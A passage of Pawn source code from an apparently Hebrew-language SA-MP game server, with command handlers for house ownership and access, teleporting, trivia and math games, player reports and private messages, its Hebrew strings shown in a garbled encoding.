		if(!strlen(cmd)) return SendClientMessage(playerid,white," /save2 [pos name] :Ўх°· ф∙щюх∙");
		new Float:p[4], string[M_S], File:f;
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		format(string,sizeof(string),"%.4f,%.4f,%.4f,%.4f // %s",p[0],p[1],p[2],p[3],cmd);
		f = fopen("/DM/Positions.txt",fexist("/DM/Positions.txt")? io_write:io_append);
		fwrite(f,string);
		fclose(f);
		SendClientMessage(playerid,green," .Ё∙ю°");
		return 1;
	}
	/*if(equal(cmd,"/house"))
	{
	    //if(playerinfo[playerid][houseid] == INVALID_HOUSE_ID) return SendClientMessage(playerid,red," .рщя ьъ сщ·");
	    new string[350],f[M_S];
	    if(PlayerDefinedName(playerid)) format(f,sizeof(f),@c(lightblue) ":%s фсщ· ∙ь %s",GetName(playerid),playerinfo[playerid][rname]);
	    else format(f,sizeof(f),@c(lightblue) ":%s фсщ· ∙ь",GetName(playerid));
	    format(string,sizeof(string),@c(grey) "╗ " @c(lightblue) "%d " @c(green) ":ёшшщёшщўх· хЄ°щы· сщ· юёЇ°\n" @c(grey) "Х " @c(white) "Ёщфхь хЄ°щы· юЇ·чх· фсщ·",playerinfo[playerid][houseid]);
	    strcat(string,"\n" @c(grey) "Х " @c(white) "Є°щыф хющўхэ °щфхш ЇЁщющ/чщЎхЁщ ьсщ·\n" @c(grey) "Х " @c(white) "ьўщч· ыь фюЇ·чх· ю∙чўЁщэ сЄьщ тщ∙ф ьсщ·\n" @c(grey) "Х " @c(white) "∙щтх° ьыЁщёф ьсщ·\n" @c(grey) "Х " @c(white) "юыщ°· ыь фрсщц°щэ ∙ь фсщ·\n" @c(grey) "Х " @c(red) "юыщ°· фсщ· ь∙°·");
	    ShowPlayerDialog(playerid,dialog_house,DIALOG_STYLE_LIST,f,string,"рщ∙х°","щЎщрф");
	    return 1;
	}*/
	if(equal(cmd,"/house"))
	{
	    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .юЄ°ы· цх Ёчёюф х·Єьф сў°хс ь∙°·");
		if(playerinfo[playerid][houseid] == -1) return SendClientMessage(playerid,red," .рщя ьъ сщ·");
		if(!playerinfo[playerid][houseacc][playerinfo[playerid][houseid]]) return SendClientMessage(playerid,red," .рщя ьъ тщ∙ф ьсщ·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /house tele :∙щЁхщ ∙щтх° фсщ·");
			SendClientMessage(playerid,white," /house giveacc [id/name] :Ё·щЁ· тщ∙ф ьсщ·");
			SendClientMessage(playerid,white," /house removeacc [id/name] :ючщў· тщ∙ф ьсщ·");
			SendClientMessage(playerid,white," /house delete :ючщў· фсщ·");
			SendClientMessage(playerid,white," /house acclist :°∙щю· сЄьщ фтщ∙х· ьсщ·");
			SendClientMessage(playerid,white," /house nremoveacc [name] :ючщў· тщ∙ф ьсщ· ь∙чўя ьр ючхс°");
			SendClientMessage(playerid,white," /house removeallacc :рщЇхё °∙щю· фтщ∙х· ьсщ· ∙ьъ");
			return 1;
		}
		new f[M_S], string[M_S], h = playerinfo[playerid][houseid];
		format(f,sizeof(f),"/DM/Houses/%d.ini",h);
		if(equal(cmd,"tele"))
		{
			new Float:p[4];
			if(IsPlayerInAnyVehicle(playerid))
			{
				GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
				GetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
			}
			else
			{
				GetPlayerPos(playerid,p[0],p[1],p[2]);
				GetPlayerFacingAngle(playerid,p[3]);
			}
			if(GetPlayerDistanceToPointEx(playerid,houseinfo[h][hx],houseinfo[h][hy],houseinfo[h][hz]) > 85.0) return SendClientMessage(playerid,red," .фющўхэ фцф °чхў юущ юфсщ· ∙ьъ");
			for(new i=0;i<4;i++) houseinfo[playerinfo[playerid][houseid]][hp][i] = p[i];
			fsetfloat(f,"X",p[0]);
			fsetfloat(f,"Y",p[1]);
			fsetfloat(f,"Z",p[2]);
			fsetfloat(f,"A",p[3]);
			SendClientMessage(playerid,orange," .∙щЁщ· р· ющўхэ ф∙щтх° ьсщ· ∙ьъ");
		}
		else if(equal(cmd,"giveacc"))
		{
			new accs = 0;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string)) accs++;
			}
			if(accs >= max_houseacc-1) return SendClientMessage(playerid,red," .ьр Ёщ·я ь·· юЄь " #max_houseacc " тщ∙х·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /house giveacc [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			CheckHouseAcc(id,h);
			if(playerinfo[id][houseacc][h]) return SendClientMessage(playerid,red," .ью∙·ю∙ фцф ыс° щ∙ ьтщ∙ф ьсщ· ∙ьъ");
			playerinfo[id][houseacc][h] = 1;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(!fkeyexist(f,string))
				{
					fsetstring(f,string,GetName(id));
					break;
				}
			}
			format(string,sizeof(string)," .%s Ё·· тщ∙ф ьсщ· ∙ьъ ь",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .Ё·я ьъ тщ∙ф ьсщ· ∙ьх %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		else if(equal(cmd,"removeacc"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /house removeacc [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			CheckHouseAcc(id,h);
			if(!playerinfo[id][houseacc][h]) return SendClientMessage(playerid,red," .ью∙·ю∙ фцф рщя тщ∙ф ьсщ· ∙ьъ");
			if(id == playerid) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх Єь ЄЎюъ");
			playerinfo[id][houseacc][h] = 0;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && equal(GetName(id),fgetstring(f,string)))
				{
					fremovekey(f,string);
					break;
				}
			}
			format(string,sizeof(string)," .%s фх°у· р· тщ∙ф ьсщ· ∙ьъ ь",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фх°щу ьъ р· фтщ∙ф ьсщ· ∙ьх %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		else if(equal(cmd,"delete"))
		{
			fsetfloat(f,"X",houseinfo[h][hx]);
			fsetfloat(f,"Y",houseinfo[h][hy]);
			fsetfloat(f,"Z",houseinfo[h][hz]);
			fsetfloat(f,"A",0.0);
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string)) fremovekey(f,string);
			}
			houseinfo[h][hp][0] = houseinfo[h][hx],
			houseinfo[h][hp][1] = houseinfo[h][hy],
			houseinfo[h][hp][2] = houseinfo[h][hz],
			houseinfo[h][hp][3] = 0.0;
			playerinfo[playerid][houseid] = -1,
			playerinfo[playerid][houseacc][h] = 0;
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][houseacc][h]) playerinfo[i][houseacc][h] = 0;
			fsetstring(f,"Owner","None");
			fsetint(fuser(playerid),"PlayerHouse2",-1);
			SendClientMessage(playerid,orange," .ючў· р· фсщ· ∙ьъ");
			PlaySound(playerid,1149);
			UpdateHouseText(h);
		}
		else if(equal(cmd,"acclist"))
		{
			new accs = 0, list[M_S];
			SendClientMessage(playerid,lightblue," ~~~ :°∙щю· сЄьщ фтщ∙х· ьсщ· ∙ьъ ~~~");
			for(new i=0;i<max_houseacc;i+=2)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(!fkeyexist(f,string)) if(i == max_houseacc-1) break; else continue;
				format(list,sizeof(list)," %d. %s",++accs,fgetstring(f,string));
				format(string,sizeof(string),"Acc%d",++i);
				if(!fkeyexist(f,string))
				{
					if(i == max_houseacc-1)
					{
						accs++;
						SendClientMessage(playerid,yellow,list);
						break;
					}
					else continue;
				}
				format(list,sizeof(list),"%s Х %d. %s",list,++accs,fgetstring(f,string));
				SendClientMessage(playerid,yellow,list);
				list = "";
			}
			if(!accs) return SendClientMessage(playerid,red," .рщя сЄьщ тщ∙х· ьсщ· ∙ьъ");
			format(string,sizeof(string)," .ёъ фыь %d ю∙·ю∙щэ сЄьщ тщ∙ф",accs);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"nremoveacc"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /house nremoveacc [name] :Ўх°· ф∙щюх∙");
			if(!IsValidNick(cmd)) return SendClientMessage(playerid,red," .ыщЁхщ ∙тхщ");
			if(equal(cmd,GetName(playerid))) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх Єь ЄЎюъ");
			new accID = -1;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && equal(cmd,fgetstring(f,string)))
				{
					accID = i;
					break;
				}
			}
			if(accID == -1) return SendClientMessage(playerid,red," .фыщЁхщ ьр ЁюЎр с°∙щю· сЄьщ фтщ∙ф ьсщ·ъ");
			format(string,sizeof(string),"Acc%d",accID);
			fremovekey(f,string);
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && equal(GetName(i),cmd))
				{
					playerinfo[i][houseacc][h] = 0;
					format(string,sizeof(string)," .фх°щу ьъ р· фтщ∙ф ьсщ· ∙ьх %s",GetName(playerid));
					SendClientMessage(i,green,string);
					break;
				}
			}
			format(string,sizeof(string)," .%s фх°у· р· тщ∙ф ьсщ· ∙ьъ ь",cmd);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"removeallacc"))
		{
			new accs = 0;
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && !equal(GetName(playerid),fgetstring(f,string)))
				{
					accs++;
					fremovekey(f,string);
				}
			}
			format(string,sizeof(string)," .фх°щу ьъ р· фтщ∙ф ьсщ· ∙ьх %s",GetName(playerid));
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][houseacc][h] && i != playerid)
			{
				playerinfo[i][houseacc][h] = 0;
				SendClientMessage(i,green,string);
			}
			if(!accs) return SendClientMessage(playerid,red," .рщя сЄьщ тщ∙х· ьсщ· ∙ьъ");
			format(string,sizeof(string)," .фхё°ф тщ∙ф ь %d ю∙·ю∙щэ ёъ фыь",accs);
			SendClientMessage(playerid,green,string);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/buyhouse"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· °∙хэ хючхс°");
		new f[M_S], string[M_S], h = playerinfo[playerid][houseid];
		if(h == -1) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссщ· сыущ ьсЎЄ Їўхуф цх");
		if(GetMoney(playerid) < houseinfo[h][hcost]) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фсщ· фцф");
		format(f,sizeof(f),"/DM/Houses/%d.ini",h);
		if(playerinfo[playerid][houseid] == h) return SendClientMessage(playerid,red," .фсщ· фцф ыс° ссЄьх·ъ");
		if(playerinfo[playerid][houseid] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ сщ·");
		if(!equal(fgetstring(f,"Owner"),"None"))
		{
			format(string,sizeof(string)," .%s фсщ· фцф ыс° ссЄьх·х ∙ь",fgetstring(f,"Owner"));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		fsetfloat(f,"X",houseinfo[h][hx]);
		fsetfloat(f,"Y",houseinfo[h][hy]);
		fsetfloat(f,"Z",houseinfo[h][hz]);
		fsetfloat(f,"A",0.0);
		for(new i=0;i<max_houseacc;i++)
		{
			format(string,sizeof(string),"Acc%d",i);
			if(fkeyexist(f,string)) fremovekey(f,string);
		}
		fsetstring(f,"Acc0",GetName(playerid));
		houseinfo[h][hp][0] = houseinfo[h][hx],
		houseinfo[h][hp][1] = houseinfo[h][hy],
		houseinfo[h][hp][2] = houseinfo[h][hz],
		houseinfo[h][hp][3] = 0.0;
		playerinfo[playerid][houseid] = h,
		playerinfo[playerid][houseacc][h] = 1;
		GiveMoney(playerid,0-houseinfo[h][hcost], 33);
		fsetint(fuser(playerid),"PlayerHouse2",h);
		fsetstring(f,"Owner",GetName(playerid));
		UpdateHouseText(h);
		format(string,sizeof(string)," ╗ /Mode 46 ?°ы∙ сщ· стхуь %d! °хЎщэ тэ %s",houseinfo[h][hsize],GetName(playerid));
		SendClientMessageToAll(orange,string);
		SendClientMessage(playerid,green," /house :ўЁщ· р· фсщ· фцф, ф∙·ю∙ сЇўхуф фсрф ь°∙щю· рЇ∙°хщх·");
		SendClientMessage(playerid,green," /h :хсЇўхуф фцх ьф∙·т°х· рь фсщ·");
		PlaySound(playerid,1149);
		return 1;
	}
	if(equal(cmd,"/h"))
	{
	    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .юЄ°ы· цх Ёчёюф х·Єьф сў°хс ь∙°·");
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 1");
		if(playerinfo[playerid][houseid] == -1) return SendClientMessage(playerid,red," .рщя ьъ сщ·");
		if(!CanBeTeleported(playerid)) return 1;
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,houseinfo[playerinfo[playerid][houseid]][hp][0]+floatrand(-1.0,1.0),houseinfo[playerinfo[playerid][houseid]][hp][1]+floatrand(-1.0,1.0),houseinfo[playerinfo[playerid][houseid]][hp][2]);
				SetPlayerFacingAngle(playerid,houseinfo[playerinfo[playerid][houseid]][hp][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),houseinfo[playerinfo[playerid][houseid]][hp][0]+floatrand(-3.0,3.0),houseinfo[playerinfo[playerid][houseid]][hp][1]+floatrand(-3.0,3.0),houseinfo[playerinfo[playerid][houseid]][hp][2],playerid);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),houseinfo[playerinfo[playerid][houseid]][hp][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),houseinfo[playerinfo[playerid][houseid]][hint]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,houseinfo[playerinfo[playerid][houseid]][hint]);
		SetPlayerVirtualWorld(playerid,world_normal);
		GameTextForPlayer(playerid,"~y~]~r~your~h~s~n~~h~house~y~]",1500,4);
		return 1;
	}
	if(equal(cmd,"/oh"))
	{
	    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .юЄ°ы· цх Ёчёюф х·Єьф сў°хс ь∙°·");
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /oh [house id] :Ўх°· ф∙щюх∙");
		new h = strval(cmd), f[M_S], string[M_S];
		if(h < 0 || h > max_houses-1) return SendClientMessage(playerid,red," .юёЇ° сщ· ∙тхщ");
		CheckHouseAcc(playerid,h);
		if(!playerinfo[playerid][houseacc][h]) return SendClientMessage(playerid,red," .рщя ьъ тщ∙ф ьсщ· фцф");
		if(!CanBeTeleported(playerid)) return 1;
		format(f,sizeof(f),"/DM/Houses/%d.ini",h);
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,houseinfo[h][hp][0]+floatrand(-1.0,1.0),houseinfo[h][hp][1]+floatrand(-1.0,1.0),houseinfo[h][hp][2]);
				SetPlayerFacingAngle(playerid,houseinfo[h][hp][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),houseinfo[h][hp][0]+floatrand(-3.0,3.0),houseinfo[h][hp][1]+floatrand(-3.0,3.0),houseinfo[h][hp][2],playerid);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),houseinfo[h][hp][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),houseinfo[h][hint]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,houseinfo[h][hint]);
		SetPlayerVirtualWorld(playerid,world_normal);
		format(string,sizeof(string),"~y~]~g~%s\'s~n~~h~house~y~]",fgetstring(f,"Owner"));
		GameTextForPlayer(playerid,string,1500,4);
		return 1;
	}
	if(equal(cmd,"/math"))
	{
		if(maths[0] == -1 || maths[1] == -1 || maths[2] == -1) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ю·юшщўф ыЄ·");
		if(playerinfo[playerid][pmath] != -1) return SendClientMessage(playerid,red," .Ёщ·я ь∙ьхч ·∙хсф ЇЄэ рч· сыь ЇЄщьх·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /math [answer] :Ўх°· ф∙щюх∙");
		new num = strval(cmd);
		playerinfo[playerid][pmath] = num;
		if(num == maths[3] && maths[5] == -1) maths[5] = playerid;
		SendClientMessage(playerid,green," .ф·∙хсф ∙∙ьч· Ё∙ьчф. рЁр фю·я ь°рх· рэ цыщ·");
		return 1;
	}
	if(equal(cmd,"/startmath") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0 || thereIsWol) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ю∙Ёщ· ЇхЄь·");
		Math();
		return 1;
	}
	if(equal(cmd,"/trivia"))
	{
		if(trivia[0] == -1) return SendClientMessage(playerid,red," .рщя ш°щххщф ыЄ·");
		if(playerinfo[playerid][ptrivia] != -1) return SendClientMessage(playerid,red," .Ёщ·я ь∙ьхч ·∙хсф ЇЄэ рч· сш°щххщф рч· сьсу");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /trivia [answer] :Ўх°· ф∙щюх∙");
		new ans = strval(cmd);
		if(ans < 1 || ans > 3) return SendClientMessage(playerid,red," .юёЇ° ·∙хсф ∙тхщ");
		playerinfo[playerid][ptrivia] = ans;
		if(ans == trivia[0] && trivia[1] == -1) trivia[1] = playerid;
		SendClientMessage(playerid,green," .ф·∙хсф ∙∙ьч· Ё∙ьчф. рЁр фю·я ь°рх· рэ цыщ·");
		return 1;
	}
	if(equal(cmd,"/starttrivia") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0 || thereIsWol) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ю∙Ёщ· ЇхЄь·");
		Trivia();
		return 1;
	}
	if(equal(cmd,"/bug"))
	{
		fileCheck(file_bugs);
		if(reporting[0]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф сў°хс, рЁр фю·я");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /bug [bug information] :Ўх°· ф∙щюх∙");
		new string[M_S], File:f;
		f = fopen(file_bugs,io_append);
		if(!f) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх, Ўх° ў∙° Єэ ффЁфьф ссў∙ф");
		format(string,sizeof(string),"- [%s %s] Bug reported by %s (%s): %s\r\n",GetDateAsString(),GetTimeAsString(),GetName(playerid),GetIP(playerid),cmd);
		fwrite(f,string);
		fclose(f);
		reporting[0] = 1;
		SetTimerEx("Reporting",12000,0,"i",0);
  		SendClientMessage(playerid,green," :·хуф Єь ущххч фсрт");
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green," Х .фЁфь· ф∙°· ··ўя рх·х сфўуэ");
		return 1;
	}
	if(equal(cmd,"/advice"))
	{
		fileCheck(file_advices);
		if(reporting[1]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф сў°хс, рЁр фю·я");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /advice [advice information] :Ўх°· ф∙щюх∙");
		new string[M_S], File:f;
		f = fopen(file_advices,io_append);
		if(!f) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх, Ўх° ў∙° Єэ ффЁфьф ссў∙ф");
		format(string,sizeof(string),"- [%s %s] Advice from %s (%s): %s\r\n",GetDateAsString(),GetTimeAsString(),GetName(playerid),GetIP(playerid),cmd);
		fwrite(f,string);
		fclose(f);
		reporting[1] = 1;
		SetTimerEx("Reporting",12000,0,"i",1);
  		SendClientMessage(playerid,green," :·хуф Єь ффЎЄф");
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green," Х .сющуф хфЎЄф \\ °Єщхя цф щ·рщэ ь∙°·, фхр щхыЁё ьюху \\ ьўфщьф");
		return 1;
	}
	if(equal(cmd,"/preport"))
	{
		fileCheck(file_preports);
		if(reporting[2]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф сў°хс, рЁр фю·я");
		new plN[M_S], pl = INVALID_PLAYER_ID, string[M_S], File:f;
		plN = strtok(cmdtext,idx), cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /preport [player name] [report information] :Ўх°· ф∙щюх∙");
		if(IsNumeric(cmd) && strlen(cmd) < 3) return SendClientMessage(playerid,red," /report :Їўхуф цх Єхсу· Єэ ыщЁхщ юухщщў хьр рщщущ, ыущ ∙·хыь ьуххч тэ Єь ∙чўя ∙ьр ючхс° ь∙°·. ьущххч Єь ∙чўя ючхс°");
		if(!IsValidNick(plN)) return SendClientMessage(playerid,red," .ыщЁхщ ∙тхщ");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),plN))
		{
			pl = i;
			break;
		}
		if(!fexist(string)) if(pl == INVALID_PLAYER_ID)
		{
			format(string,sizeof(string),"/DM/Users/%s.ini",plN);
			return SendClientMessage(playerid,red," .∙э ю∙·ю∙ цф ьр ўщщэ с°∙щю· фю∙·ю∙щэ");
		}
		else format(string,sizeof(string),"%s (Guest)",GetName(pl));
		f = fopen(file_preports,io_append);
		if(!f) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх, Ўх° ў∙° Єэ ффЁфьф ссў∙ф");
		format(string,sizeof(string),"- [%s %s] PReport from %s (%s) on %s: %s\r\n",GetDateAsString(),GetTimeAsString(),GetName(playerid),GetIP(playerid),pl == INVALID_PLAYER_ID ? (plN) : (string),cmd);
		fwrite(f,string);
		fclose(f);
		reporting[2] = 1;
		SetTimerEx("Reporting",12000,0,"i",2);
		format(string,sizeof(string)," :%s ·хуф Єь фущххч Єь ф∙чўя",plN);
  		SendClientMessage(playerid,green,string);
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green," Х .рЁх ЁшЇь сЄЁщщя сфўуэ");
		return 1;
	}
	if(equal(cmd,"/areport"))
	{
		if(IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .р·ф рующя, рщя ьъ Ўх°ъ сЇўхуф цх");
		fileCheck(file_areports);
		if(reporting[3]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф сў°хс, рЁр фю·я");
		new adName[M_S], string[M_S], File:f;
		adName = strtok(cmdtext,idx), cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /areport [admin name] [report information] :Ўх°· ф∙щюх∙");
		if(!IsValidNick(adName)) return SendClientMessage(playerid,red," .ыщЁхщ ∙тхщ");
		if(!fkeyexist(file_admins,adName)) return SendClientMessage(playerid,red," .ыщЁхщ цф ьр ўщщэ с°∙щю· фрующЁщэ");
		f = fopen(file_areports,io_append);
		if(!f) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх, Ўх° ў∙° Єэ ффЁфьф ссў∙ф");
		format(string,sizeof(string),"- [%s %s] AReport from %s (%s) on %s: %s\r\n",GetDateAsString(),GetTimeAsString(),GetName(playerid),GetIP(playerid),adName,cmd);
		fwrite(f,string);
		fclose(f);
		reporting[3] = 1;
		SetTimerEx("Reporting",12000,0,"i",3);
		format(string,sizeof(string)," :%s ·хуф Єь фущххч Єь фрующя",adName);
  		SendClientMessage(playerid,green,string);
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green," Х .рЁх ЁшЇь сЄЁщщя сфўуэ");
		return 1;
	}
	if(equal(cmd,"/creport"))
	{
		fileCheck(file_creports);
		if(reporting[4]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф сў°хс, рЁр фю·я");
		new clName[M_S], cid, string[M_S], File:f;
		clName = strtok(cmdtext,idx), cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /creport [clan name] [report information] :Ўх°· ф∙щюх∙");
		cid = clannumber(clName);
		if(!cid) return SendClientMessage(playerid,red," .ўьря цф ьр ўщщэ с°∙щю· фўьрЁщэ");
		f = fopen(file_creports,io_append);
		if(!f) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх, Ўх° ў∙° Єэ ффЁфьф ссў∙ф");
		format(string,sizeof(string),"- [%s %s] CReport from %s (%s) on %s: %s\r\n",GetDateAsString(),GetTimeAsString(),GetName(playerid),GetIP(playerid),claninfo[cid][cname],cmd);
		fwrite(f,string);
		fclose(f);
		reporting[4] = 1;
		SetTimerEx("Reporting",12000,0,"i",4);
		format(string,sizeof(string)," :%s ·хуф Єь фущххч Єь фўьря",claninfo[cid][cname]);
  		SendClientMessage(playerid,green,string);
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green," Х .рЁх ЁшЇь сЄЁщщя сфўуэ");
		return 1;
	}
 	if(equal(cmd,"/private") || equal(cmd,"/pm"))
 	{
 		new id[MAX_PLAYERS] = {INVALID_PLAYER_ID,...}, bool:sentto[MAX_PLAYERS] = {false,...}, ids = 0, string[M_S], tmp[256], idx2 = 0, sent = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /private(pm) [id/name list] [text] :Ўх°· ф∙щюх∙");
		if(strfind(cmd,",") != -1)
		{
			tmp = strtok(cmd,idx2,',');
			while(strlen(tmp) > 0) id[ids++] = ReturnUser(tmp,playerid), tmp = strtok(cmd,idx2,',');
			if(ids > 5 && !playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ь∙ьхч р· ффхуЄф ьщх·° ю-5 ∙чўЁщэ");
		}
		else id[ids++] = ReturnUser(cmd,playerid);
		if(ids == 1)
		{
			if(!IsPlayerConnected(id[0]) || (IsPlayerNPC(id[0]) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(IsPlayerNPC(id[0])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id[0] == playerid) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
			if(playerinfo[id[0]][ignore][playerid] == 1) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙ьхч р· ффхуЄф стьь ∙∙чўя цф чёэ рх·ъ");
		}
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /private(pm) [id/name] [text] :Ўх°· ф∙щюх∙");
		if(strlen(cmd) > 150) return SendClientMessage(playerid,red," .ффхуЄф р°хыф юущ");
		if(ids > 1) playerinfo[playerid][pmlist] = 1;
		for(new i = 0, st = 0; i < ids; i++) if(IsPlayerConnected(id[i]) && id[i] != playerid && !sentto[id[i]])
		{
			st = OnPlayerPrivmsg(playerid,id[i],cmd);
			if(st > 0)
			{
				playerinfo[id[i]][lastpm] = playerid;
				format(string,sizeof(string)," PM sent to %s(%d): %s",GetName(id[i]),id[i],cmd);
				SendClientMessage(playerid,0xFFFF00FF,string);
				//PlayAudioStreamForPlayer(playerid,audio_url "chat_message_outbound.wav");
				format(string,sizeof(string)," PM from %s(%d): %s",GetName(playerid),playerid,cmd);
				SendClientMessage(id[i],0xFFFF00FF,string);
				//PlayAudioStreamForPlayer(id[i],audio_url "chat_message_inbound.wav");
				sent++, sentto[id[i]] = true;
			}
			else if(!st) break;
		}
		if(ids > 1)
		{
